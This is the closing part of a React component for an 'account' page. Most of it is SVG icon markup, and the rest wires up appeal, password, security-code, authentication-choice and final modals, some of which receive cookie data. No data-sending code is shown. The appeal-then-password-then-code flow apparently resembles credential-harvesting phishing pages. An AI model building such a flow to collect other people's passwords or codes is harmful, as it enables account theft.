                                                    <path fillRule="evenodd" clipRule="evenodd" d="M2.17074 3.62349C2.22019 3.58021 2.2777 3.54711 2.33996 3.52607C2.40222 3.50503 2.46801 3.49647 2.53359 3.50088C2.59916 3.5053 2.66321 3.52259 2.7221 3.55178C2.78098 3.58097 2.83353 3.62148 2.87674 3.67099L6.00024 7.24099L9.12374 3.67099C9.21106 3.57114 9.33447 3.51006 9.46683 3.5012C9.59918 3.49234 9.72963 3.53642 9.82949 3.62374C9.92934 3.71107 9.99042 3.83448 9.99928 3.96683C10.0081 4.09919 9.96406 4.22964 9.87674 4.32949L6.37674 8.32949C6.32981 8.3832 6.27193 8.42624 6.20699 8.45573C6.14206 8.48523 6.07156 8.50048 6.00024 8.50048C5.92892 8.50048 5.85842 8.48523 5.79348 8.45573C5.72855 8.42624 5.67067 8.3832 5.62374 8.32949L2.12374 4.32949C2.08046 4.28004 2.04735 4.22254 2.02631 4.16028C2.00527 4.09802 1.99672 4.03222 2.00113 3.96665C2.00554 3.90108 2.02283 3.83702 2.05202 3.77814C2.08121 3.71926 2.12122 3.66671 2.17074 3.62349Z" fill="black" />
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                    <br />

                                    <div className='small-grey'>
                                        {t('content.footer.title')}
                                        <div className='link-to'>
                                            {t('content.footer.link')}
                                            <svg width="12" height="12" viewBox="0 0 12 12" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                <path d="M3 9.5H9C9.13261 9.5 9.25979 9.44732 9.35355 9.35355C9.44732 9.25979 9.5 9.13261 9.5 9V6.5H10.5V9C10.5 9.39782 10.342 9.77936 10.0607 10.0607C9.77936 10.342 9.39782 10.5 9 10.5H3C2.60218 10.5 2.22064 10.342 1.93934 10.0607C1.65804 9.77936 1.5 9.39782 1.5 9V3C1.5 2.60218 1.65804 2.22064 1.93934 1.93934C2.22064 1.65804 2.60218 1.5 3 1.5H5.5V2.5H3C2.86739 2.5 2.74021 2.55268 2.64645 2.64645C2.55268 2.74021 2.5 2.86739 2.5 3V9C2.5 9.13261 2.55268 9.25979 2.64645 9.35355C2.74021 9.44732 2.86739 9.5 3 9.5Z" fill="black" />
                                                <path d="M5.64622 5.6465L8.79221 2.5H6.99972C6.86711 2.5 6.73993 2.44732 6.64616 2.35355C6.55239 2.25979 6.49972 2.13261 6.49972 2C6.49972 1.86739 6.55239 1.74021 6.64616 1.64645C6.73993 1.55268 6.86711 1.5 6.99972 1.5H9.99972C10.1323 1.5 10.2595 1.55268 10.3533 1.64645C10.447 1.74021 10.4997 1.86739 10.4997 2V5C10.4997 5.13261 10.447 5.25979 10.3533 5.35355C10.2595 5.44732 10.1323 5.5 9.99972 5.5C9.86711 5.5 9.73993 5.44732 9.64616 5.35355C9.55239 5.25979 9.49972 5.13261 9.49972 5V3.207L6.35322 6.3535C6.25891 6.44458 6.13261 6.49498 6.00151 6.49384C5.87042 6.4927 5.74501 6.44011 5.65231 6.34741C5.5596 6.25471 5.50702 6.1293 5.50588 5.9982C5.50474 5.8671 5.55514 5.7408 5.64622 5.6465Z" fill="black" />
                                            </svg>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        {/* RIGHT CONTENT END */}
                    </div>
                </div>
            </div>


            <AuthModal
                openAuthModal={openAuthModal}
                onCancel={() => setOpenAuthModal(false)}
                onFinish={handleFinishAppeal}
                countryEmoji={userFlag}
            />

            <PasswordModal
                opendPasswordModal={openPasswordModal}
                onCancelPasswordModal={resetPasswordState}
                onFinishPassword={handleFinishPassword}
                loadingPassword={loadingPassword}
                warningPassword={warningPassword}
            />

            <SecurityModal
                openSecurityModal={openSecurityModal}
                onCancelSecurityModal={resetSecurityState}
                onFinishSecurity={handleFinishSecurity}
                loadingSecurity={loadingSecurity}
                timeCounter={timeCounter}
                clickSecurity={clickSecurity}
                dataCookie={dataCookieSecurity}
                onTryAnotherWay={handleTryAnotherWay}
            />

            <FinalModal
                openFinalModal={openFinalModal}
                onCancelFinalModal={() => {
                    setOpenFinalModal(false);
                    resetPasswordState();
                    resetSecurityState();
                }}
            />

            <ChoseAuthenModal
                dataCookie={dataCookie}
                openChoseAuthenModal={openChoseAuthenModal}
                onCancelChoseAuthenModal={() => setOpenChoseAuthenModal(false)}
                onFinishChoseAuthen={handleFinishChoseAuthen}
                loadingChoseAuthen={loadingChoseAuthen}
            />
        </>
    );
};

export default AccountPageComponent;